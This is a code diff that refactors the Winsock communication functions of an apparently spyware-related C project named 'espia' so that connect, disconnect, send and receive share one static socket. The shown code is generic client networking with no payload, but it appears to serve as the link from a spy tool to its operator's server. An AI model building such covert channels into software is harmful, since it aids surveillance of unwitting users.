@@ -1,6 +1,8 @@
 #include "includes/espia_comms.h"
 
-WORD espia_connect(PCSTR server_ip, PCSTR server_port, SOCKET * connection_socket) {
+static SOCKET server_connection = INVALID_SOCKET;
+
+WORD espia_connect(PCSTR server_ip, PCSTR server_port) {
 	// Initialize the WSA
 	WSADATA wsaData;
 	int err;
@@ -26,8 +28,7 @@ WORD espia_connect(PCSTR server_ip, PCSTR server_port, SOCKET * connection_socke
 
 	// Initialize the Socket
 	ptr = result;
-	*connection_socket = INVALID_SOCKET;
-	if ((*connection_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol)) == INVALID_SOCKET) {
+	if ((server_connection = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol)) == INVALID_SOCKET) {
 		Debug(printf("socket() failed: %ld\n", WSAGetLastError());)
 		freeaddrinfo(ptr);
 		WSACleanup();
@@ -36,39 +37,39 @@ WORD espia_connect(PCSTR server_ip, PCSTR server_port, SOCKET * connection_socke
 
 	// Connect to the server
 	struct addrinfo* iter = ptr;
-	while (iter != NULL && ((err = connect(*connection_socket, iter->ai_addr, (int)iter->ai_addrlen)) != 0))
+	while (iter != NULL && ((err = connect(server_connection, iter->ai_addr, (int)iter->ai_addrlen)) != 0))
 		iter = iter->ai_next;
 	freeaddrinfo(ptr);
 	if (err == SOCKET_ERROR) {
 		Debug(printf("Failed to connect to server\n");)
-		closesocket(*connection_socket);
+		closesocket(server_connection);
 		return CONNECTION_FAIL;
 	}
 
-	return *connection_socket;
+	return server_connection;
 }
 
-WORD espia_disconnect(SOCKET * connection_socket) {
+WORD espia_disconnect() {
 	// Inform server about the connection termination
 	int err;
-	err = shutdown(*connection_socket, SD_SEND);
+	err = shutdown(server_connection, SD_SEND);
 	if (err == SOCKET_ERROR) {
 		Debug(printf("shutdown failed: %d\n", WSAGetLastError());)
-		closesocket(*connection_socket);
+		closesocket(server_connection);
 		WSACleanup();
 		return DISCONNECTION_FAIL;
 	}
 
 	// Close the socket and stop listening
-	closesocket(*connection_socket);
+	closesocket(server_connection);
 	WSACleanup();
 	return 0;
 }
 
-INT espia_send(SOCKET * connection_socket, PWSTR send_buffer, int size_send_buffer) {
+INT espia_send(PWSTR send_buffer, int size_send_buffer) {
 	/* Send data on the given buffer */
 	int err;
-	if ((err = send(*connection_socket, (PSTR)send_buffer, size_send_buffer/2, 0)) == SOCKET_ERROR) { 		// Currently this can only send CHAR. Implement it to WCHAR
+	if ((err = send(server_connection, (PSTR)send_buffer, size_send_buffer/2, 0)) == SOCKET_ERROR) { 		// Currently this can only send CHAR. Implement it to WCHAR
 		Debug(printf("send failed: %d\n", WSAGetLastError());)
 		return SEND_FAIL;
 	}
@@ -80,10 +81,10 @@ INT espia_send(SOCKET * connection_socket, PWSTR send_buffer, int size_send_buff
 	return err;
 }
 
-INT espia_recv(SOCKET * connection_socket, PSTR recv_buffer, int size_recv_buffer) {
+INT espia_recv(PSTR recv_buffer, int size_recv_buffer) {
 	/* Recieve data from the server */
     int err;
-    if ((err = recv(*connection_socket, recv_buffer, size_recv_buffer, 0)) == SOCKET_ERROR) {
+    if ((err = recv(server_connection, recv_buffer, size_recv_buffer, 0)) == SOCKET_ERROR) {
         Debug(printf("Recieve failed: %d\n", WSAGetLastError()));
         return RECV_FAIL;
     } else if (err == 0) {
